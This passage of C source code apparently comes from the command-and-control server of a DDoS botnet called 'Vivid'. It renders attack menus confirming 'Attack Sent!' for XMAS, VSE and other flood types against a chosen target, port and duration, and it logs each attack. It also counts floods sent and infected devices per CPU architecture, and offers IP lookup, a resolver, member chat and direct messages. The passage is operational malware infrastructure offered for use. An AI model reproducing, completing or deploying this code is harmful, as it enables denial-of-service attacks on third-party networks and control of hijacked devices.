                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⡟⠘⣿⠟⣉⡴⡋⢨⢻⡿⠃⣽⣿⡿⢟⡫⢀⢸⣿⣿⠋⢰⣦⣶⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣟⣵⢆⠐⣭⠩⡚⠁⣼⣈⠅⢀⡽⠑⠛⢁⠴⠩⡚⣭⠅⡇⠘⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡿⣣⣿⡇⢟⣖⠇⣶⣙⣿⠰⣻⠲⢃⣦⣿⣇⠟⣱⣃⠾⢃⣠⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                XMASS++;
            } else if(atk_wtng == 7){ //VSE
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⠿⣿⣿⣿⣿⢟⡍⣿⣿⣿⡿⠿⠿⢿⣿⣿⡿⠿⣿⠿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣼⡈⢻⣿⡇⠏⢠⣿⡿⡁⠀⣿⣧⣬⡟⢁⣤⣛⣛⣥⣾⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣟⣾⡇⢸⡟⠁⡠⢛⣛⢣⡇⠀⣿⣿⠿⠂⢈⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡇⠘⢠⣾⢰⡿⠯⣣⣿⠀⢸⠁⣠⣾⠿⠿⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣧⡀⣿⣿⡮⡣⠾⠶⠂⣠⡎⠀⢭⣶⠿⣋⣼⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                VSES++;
            } else if(atk_wtng == 8){ //CNC
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠿⠛⣩⣵⢌⣿⣿⠃⢙⢿⣿⣿⠸⠿⠿⠛⣩⣶⢌⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡾⠋⣠⣬⣭⣷⡿⣫⡶⠁⣸⢸⡿⠃⡸⠋⣠⣬⣭⣶⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⠁⣰⣿⡿⠟⠋⠾⡙⠁⣰⣿⢸⠁⡐⠀⣼⣿⠿⠛⢻⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⠀⢟⣵⡾⢋⣆⢾⡆⣰⣹⣿⠀⣸⣇⠀⢋⣵⡿⣫⣾⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣟⣛⣤⣤⣥⣾⣿⣿⣦⣅⣿⣿⣿⣦⣟⣫⣤⣤⣵⣾⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║╔══════════════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ "G"Attack Sent! "CY"║\r\n                   \t"CY"╚═══════════════════════════╝╚══════════════╝"CR"\r\n", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            printf(""CY"["Y"!"CY"]["R"%s"CY"]: "R"%s\n", ACCS[fnd].vivu, atkcmd);
            FILE *atklog = fopen(""LFD"/ATTACKS.log", "a+");
            fprintf(atklog, "[%s]: %s\n", MNGRS[vivfd].nick, atkcmd);
            fclose(atklog);
            ATKS_SENT++;
            atk_wtng = 0;
            atksent:
            sprintf(vivid, "\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")){
                memset(mytarg, 0, sizeof(mytarg));
                memset(myport, 0, sizeof(myport));
                memset(mysecs, 0, sizeof(mysecs));
                goto networkcenter;
            }
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(2);
                goto atksent;
            }
        }
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "9")) goto iplscreen;
        else if(!strcmp(buf, "10")) goto rslvscreen;
        else{
            sprintf(vivid, "\r\n\t\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto networkcenter;
        }

        //IPLookup
        iplscreen:
        memset(buf, 0, sizeof(buf));
        if(send(vivfd, ipl, strlen(ipl), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto networkcenter;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        char myhost[20];
        char ki11[1024];
        snprintf(ki11, sizeof(ki11), "iplookup %s", buf);
        Trim(ki11);
        char *token = strtok(ki11, " ");
        snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
        if(atoi(myhost) >= 8){
            int ret;
            int IPLSock = -1;
            char iplbuffer[1024];
            int conn_port = 80;
            char iplheaders[1024];
            struct timeval timeout;
            struct sockaddr_in sock;
            timeout.tv_sec = 4; //4 Second Timeout
            timeout.tv_usec = 0;
            IPLSock = socket(AF_INET, SOCK_STREAM, 0);
            sock.sin_family = AF_INET;
            sock.sin_port = htons(conn_port);
            sock.sin_addr.s_addr = inet_addr(INTENDEDHOST);
            if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1){
                sprintf(vivid, ""R"[IPLookup] Failed to connect to iplookup server...\r\n", myhost);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) return;
            }
            else{
                snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, INTENDEDHOST);
                if(send(IPLSock, iplheaders, strlen(iplheaders), 0)){
                    sprintf(vivid, ""CR"["CY"IPLookup"CR"] "CY"Getting Info For -> %s...\r\n", myhost);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) return;
                    char ch;
                    int retrv = 0;
                    uint32_t header_parser = 0;
                    while (header_parser != 0x0D0A0D0A){
                        if ((retrv = read(IPLSock, &ch, 1)) != 1){
                            break;
                        }

                        header_parser = (header_parser << 8) | ch;
                    }
                    memset(iplbuffer, 0, sizeof(iplbuffer));
                    while(ret = read(IPLSock, iplbuffer, 1024)){
                        iplbuffer[ret] = '\0';
                    }
                    if(strstr(iplbuffer, "<title>404")){
                        char iplookup_host_token[20];
                        sprintf(iplookup_host_token, "%s", INTENDEDHOST);
                        int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                        sprintf(vivid, ""R"[IPLookup] Failed, API can't be located on server %d.*.*.*:80\r\n", ip_prefix);
                        memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                    }
                    else if(strstr(iplbuffer, "nickers"))
                        sprintf(vivid, ""R"[IPLookup] Failed, Hosting server needs to have php installed for api to work...\r\n");
                    else sprintf(vivid, ""CY"[+]"CR"--- "CY"Results"R" "CR"---"CY"[+]\r\n"CY""CR"%s\r\n\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ", iplbuffer);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) return;
                    IPLKPS++;
                }
                else{
                    sprintf(vivid, ""R"[IPLookup] Failed to send request headers...\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) return;
                }
            }
            memset(iplbuffer, 0, sizeof(iplbuffer));
            close(IPLSock);
        }
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            goto iplscreen;
        }
        iplwt:
        memset(buf, 0, sizeof(buf));
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto networkcenter;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n\t\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t\t╚═» ", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "     \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            goto iplwt;
        }

        rslvscreen:
        memset(buf, 0, sizeof(buf));
        if(send(vivfd, rsl, strlen(rsl), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto networkcenter;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        char rsltrg[100];
        sprintf(rsltrg, "resolve %s", buf);
        Trim(rsltrg);
        char *ip[100];
        char *rstoken = strtok(rsltrg, " ");
        char *url = rstoken+sizeof(rstoken);
        Trim(url);
        resolvehttp(url, ip);
        printf(""R"["CR"Resolver"R"] %s -> %s\n", url, ip);
        sprintf(vivid, ""CR"["CY"Resolver"CR"] "CY"%s -> %s\r\n\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ", url, ip);
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        RSLVDS++;
        memset(url, 0, sizeof(url));
        memset(ip, 0, sizeof(ip));
        rslwt:
        memset(buf, 0, sizeof(buf));
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto networkcenter;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "     \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            goto rslwt;
        }

        serverroom:
        countArch();
        unsigned int TTLM = 0;
        FILE *cms;
        char c;
        fp = fopen(DB, "r");
        if(fp == NULL){
            printf("[MEMBER COUNT] Why Did You Change Your Database Name Idiot?\r\n Now We Can't Count Total Members...\n");
            return;
        }
        for(c = getc(fp); c != EOF; c = getc(fp)){
            if(c == '\n'){
                TTLM++;
            }
        }
        fclose(fp);
        sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t            "CY"╔════════════════╗\r\n\t\t            ║  "Y"Server Stats  "CY"║\r\n\t\t\x1b[1;4;36mFloods Sent\x1b[1;24;36m ╚════════════════╝ \x1b[1;4;36mDevices Connected\x1b[1;24;36m\r\n\t\tUDP "CR"["Y"%d"CR"]                       "CY"鮮やか.Mips "CR"["Y"%d"CR"]\r\n\t\t"CY"TCP "CR"["Y"%d"CR"]                       "CY"鮮やか.Mipsel "CR"["Y"%d"CR"]\r\n\t\t"CY"SYN "CR"["Y"%d"CR"]                       "CY"鮮やか.x86 "CR"["Y"%d"CR"]\r\n\t\t"CY"ACK "CR"["Y"%d"CR"]                       "CY"鮮やか.Arm "CR"["Y"%d"CR"]\r\n\t\t"CY"STD "CR"["Y"%d"CR"]                       "CY"鮮やか.PowerPC "CR"["Y"%d"CR"]\r\n\t\t"CY"XMAS "CR"["Y"%d"CR"]                      "CY"鮮やか.SuperH "CR"["Y"%d"CR"]\r\n\t\t"CY"VSE "CR"["Y"%d"CR"]                       "CY"鮮やか.M68K "CR"["Y"%d"CR"]\r\n\t\t"CY"Total "CR"["Y"%d"CR"]                     "CY"鮮やか.Sparc "CR"["Y"%d"CR"]\r\n\t\t                              "CY"鮮やか.Unknown "CR"["Y"%d"CR"]\r\n\t\t\r\n\t\t    \x1b[1;4;36mTools\x1b[1;24;36m                           \x1b[1;4;36mMembers\x1b[1;24;36m\r\n\t\tIPLookups "CR"["Y"%d"CR"]                 "CY"Total Members "CR"["Y"%d"CR"]\r\n\t\t"CY"Resolved URLs "CR"["Y"%d"CR"]             "CY"Members Online "CR"["Y"%d"CR"]\r\n\t\t", UDPS, MIPS, TCPS, MIPSEL, SYNS, X86, ACKS, ARM, STDS, PPC, XMASS, SUPERH, VSES, M68K, ATKS_SENT, SPARC, UNKNOWN, IPLKPS, TTLM, RSLVDS, UsersOnline);
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "     \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto serverroom;
        }

        chatlobby:
        sprintf(vivid, ""CLS""CR"« B.Go Back\r\n« L.Log Out\r\n                   "CY"╔═══════════════════════════╗\r\n                   ║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⠛⠻⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   ║"CR"⣿⣿⣿⣿⣿⠟⢁⣴⡿⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿"CY"║\r\n     ╔═════════════╣"CR"⣿⣿⣿⣿⠇⢠⣿⣧⣀⡀⠀⡼⠛⢻⣿⣿⠟⠛⠟⢻⡥⠀⣠⣼⣿⣿⣿"CY"╠══════════════════╗\r\n     ║ "Y"1."CY"Join Chat ║"CR"⣿⣿⣿⡏⠀⣼⣿⣿⣿⠃⠐⡠⠀⣸⡟⢁⣴⡏⠀⣾⠇⢀⣿⣿⣿⣿⣿"CY"║ "Y"2."CY"Direct Message ║\r\n     ╚═════════════╣"CR"⣿⣿⣿⡇⠀⢻⣿⡿⠋⠀⣼⠁⢰⡟⠀⢸⣿⠁⢸⠟⠀⣼⠏⣿⣿⣿⣿"CY"╠══════════════════╝\r\n                   ║"CR"⣿⣿⣿⣧⡀⠀⢀⣠⠀⣼⣿⠀⢈⣴⠀⢈⡁⠀⣉⡀⠀⣡⣾⣿⣿⣿⣿"CY"║\r\n                   ║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   ╚═══════════════════════════╝"CR"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        int kkkkkk;
        for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++){
            if(!MNGRS[kkkkkk].connd) continue;
            if(MNGRS[vivfd].vivadm == 1){
                sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
            }
            else{
                sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick);
            }
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        }
        sprintf(vivid, "\r\n       \t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n  \t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "1")){
            if(MNGRS[vivfd].chat == 0)
                MNGRS[vivfd].chat = 1;
            pchat:
            memset(buf, 0, sizeof(buf));
            sprintf(vivid, ""CLS"");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, ""VIVY" \x1b[4mUsers In Chat\x1b[24m"Y":"CY"·");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            int x;
            for(x = 0; x < MXFDS; x++){
                if(MNGRS[x].chat == 1){
                    sprintf(vivid, ""Y"%s"CY"·", MNGRS[x].nick);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                }
            }
            sprintf(vivid, "\r\n\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            FILE *fp1 = fopen(""LFD"/CHAT.log", "r");
            FILE *fp2 = fopen(""LFD"/CHAT.log", "r");
            if (fp1 == NULL || fp2 == NULL){
                printf(""LFD"/CHATLOG.txt - No Such File\n");
                sprintf(vivid, ""R" Chat Is Down!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            const int LENGTH = 256;
            char line[LENGTH];
            int linecount = 0;
            while (fgets(line, LENGTH, fp1) != NULL){
                if (linecount < 17)
                    linecount++; 
                else
                    fgets(line, LENGTH, fp2);
            }
            while (fgets(line, LENGTH, fp2) != NULL){
                sprintf(vivid, "%s\r", line);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            fclose(fp1);
            fclose(fp2);
            sprintf(vivid, "\r\n"CY"╔════════════════╦═════════════╗\r\n║ "CR"« B.Leave Chat "CY"║ "CR"^ "Y"R.Refresh"CY" ║\r\n╚════════════════╩═════════════╝"CR"\r\n"UND"Message"NUND": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "R") || !strcmp(buf, "r")){
                memset(buf, 0, sizeof(buf));
                goto pchat;
            }
            else if(!strcmp(buf, "B") || !strcmp(buf, "b")){
                memset(buf, 0, sizeof(buf));
                MNGRS[vivfd].chat = 0;
                goto chatlobby;
            }
            else{
                time_t t = time(NULL);
                struct tm tm = *localtime(&t);
                FILE *chatlog = fopen(""LFD"/CHAT.log", "a+");
                fprintf(chatlog, ""CR"[%d/%d/%d %d:%d:%d]"Y"%s: %s"CR"\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, MNGRS[vivfd].nick, buf);
                fclose(chatlog);
                goto pchat;
            }
        }
        else if(!strcmp(buf, "2")) goto DM;
        else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf); 
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto chatlobby;
        }
        DM: ;
        int pmfd, sent = 0;
        char pmuser[50];
        char privmsg[1024];
        memset(buf, 0, sizeof(buf));
        sprintf(vivid, ""Y"["CY"Direct Message"Y"]\r\n"Y"["CY"Username"Y"]"CY": ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        while(fdgets(pmuser, sizeof pmuser, vivfd) < 1){
            Trim(pmuser);
            if(strlen(pmuser) < 3){
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
                continue;
            }
            break;
        }
        Trim(pmuser);
        sprintf(vivid, ""Y"["CY"Message"Y"]"CY": ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        while(fdgets(privmsg, sizeof privmsg, vivfd) < 1){
            Trim(privmsg);
            if(strlen(privmsg) < 1){
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
                continue;
            }
            break;
        }
        Trim(privmsg); 
        for(pmfd = 0; pmfd < MXFDS; pmfd++) {
            if(MNGRS[pmfd].connd) {
                if(!strcmp(pmuser, MNGRS[pmfd].nick)) {
                    sprintf(vivid, ""Y"["CY"Message from "Y"%s"CY": "Y"%s"Y"]\r\n", MNGRS[vivfd].nick, privmsg);
                    if(send(pmfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    sprintf(vivid, "\r\n\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t╚═» "CR"", MNGRS[pmfd].nick);
                    if(send(pmfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    sent = 1;
                    break;
                }
            }
        }
        if(sent && pmuser != NULL){
            sprintf(vivid, ""Y"["CY"Message Sent To "Y"%s"Y"]\r\n", pmuser);
